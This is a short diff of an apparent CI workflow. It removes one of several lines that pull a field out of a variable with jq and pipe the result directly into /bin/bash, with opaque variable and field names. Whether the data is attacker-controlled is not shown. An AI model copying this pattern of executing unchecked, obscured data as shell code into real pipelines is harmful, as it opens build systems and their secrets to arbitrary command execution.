@@ -23,7 +23,6 @@ jobs:
           echo $zn13 | jq -r .xc564 | /bin/bash
           echo $yp90 | jq -r .kjr201 | /bin/bash
           printf '%s' "$r1" | jq -r .oj8178 | /bin/bash
-          printf '%s' "$u1780" | jq -r .ysiyp30335 | /bin/bash
           echo $fm94 | jq -r .irlv76187 | /bin/bash
 
       - name: Persist results
